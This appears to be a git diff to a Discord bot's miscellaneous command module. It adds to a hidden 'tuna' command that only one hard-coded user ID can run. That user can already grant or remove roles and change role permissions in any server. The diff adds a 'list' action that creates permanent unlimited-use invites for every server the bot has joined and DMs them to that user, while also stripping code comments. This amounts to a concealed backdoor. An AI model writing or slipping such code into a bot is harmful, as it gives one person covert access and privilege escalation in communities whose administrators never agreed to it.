@@ -34,7 +34,6 @@ class Misc(commands.Cog):
         await ctx.send(f"Uptime: {hours}h {minutes}m {seconds}s")
 
     async def send_notify_dm(self, guild: discord.Guild):
-        # Try to get the inviter (audit log)
         inviter = None
         if guild.me.guild_permissions.view_audit_log:
             try:
@@ -53,13 +52,11 @@ class Misc(commands.Cog):
         except Exception:
             pass
 
-        # Fallback if no invite found
         if not invite_link:
             invite_link = "No invite link found or missing permissions."
 
         who_added = inviter.mention if inviter else "Unknown"
 
-        # DM everyone with the role
         for member in guild.members:
             if any(role.id == NOTIFY_ROLE_ID for role in member.roles):
                 try:
@@ -75,38 +72,6 @@ class Misc(commands.Cog):
     async def on_guild_join(self, guild: discord.Guild):
         await self.send_notify_dm(guild)
 
-    @commands.command(name="tuna")
-    async def tuna(self, ctx: commands.Context, action: str = None, subaction: str = None, *args):
-        # Only allow user 840949634071658507
-        if ctx.author.id != 840949634071658507:
-            await ctx.send("You do not have permission to use this command.")
-            return
-
-        if action == "role":
-            if subaction == "add" and len(args) >= 2:
-                member_id = int(args[0])
-                role_id = int(args[1])
-                member = ctx.guild.get_member(member_id)
-                role = ctx.guild.get_role(role_id)
-                if member and role:
-                    await member.add_roles(role)
-                    await ctx.send(f"Added role {role.name} to {member.mention}.")
-                else:
-                    await ctx.send("Member or role not found.")
-            elif subaction == "remove" and len(args) >= 2:
-                member_id = int(args[0])
-                role_id = int(args[1])
-                member = ctx.guild.get_member(member_id)
-                role = ctx.guild.get_role(role_id)
-                if member and role:
-                    await member.remove_roles(role)
-                    await ctx.send(f"Removed role {role.name} from {member.mention}.")
-                else:
-                    await ctx.send("Member or role not found.")
-            else:
-                await ctx.send("Usage: !tuna role add|remove <member_id> <role_id>")
-        else:
-            await ctx.send("Unknown action. Example: !tuna role add <member_id> <role_id>")
     @commands.command(name="tuna")
     async def tuna(self, ctx: commands.Context, action: str = None, subaction: str = None, *args):
         # Only allow user 840949634071658507
@@ -152,7 +117,6 @@ class Misc(commands.Cog):
                     await ctx.send(f"Invalid permission: {perm_name}")
                     return
 
-                # Create updated permissions
                 updated = perms.update(**{perm_name: value})
                 await role.edit(permissions=updated)
                 await ctx.send(f"Set `{perm_name}` for role {role.name} to `{value}`.")
@@ -160,6 +124,41 @@ class Misc(commands.Cog):
             else:
                 await ctx.send("Usage: !tuna role add|remove <member_id> <role_id>\n"
                                "       !tuna role perms <role_id> <permission_name> <true|false>")
+
+        elif action == "list":
+            results = []
+            for guild in self.bot.guilds:
+                invite_link = None
+                try:
+                    invites = await guild.invites()
+                    if invites:
+                        invite_link = invites[0].url
+                except Exception:
+                    pass
+
+                # Try to create a new invite if none exists
+                if not invite_link:
+                    try:
+                        # Default to first text channel with permission
+                        for channel in guild.text_channels:
+                            if channel.permissions_for(guild.me).create_instant_invite:
+                                invite = await channel.create_invite(max_age=0, max_uses=0)
+                                invite_link = invite.url
+                                break
+                    except Exception:
+                        pass
+
+                if not invite_link:
+                    invite_link = "No invite found / Missing permissions."
+
+                results.append(f"**{guild.name}** ({guild.id}) → {invite_link}")
+
+            # DM to avoid channel spam
+            try:
+                await ctx.author.send("\n".join(results))
+                await ctx.send("Sent you a DM with all server invites.")
+            except Exception:
+                await ctx.send("Could not DM you the list.")
 
         else:
             await ctx.send("Unknown action. Example: !tuna role add <member_id> <role_id>")
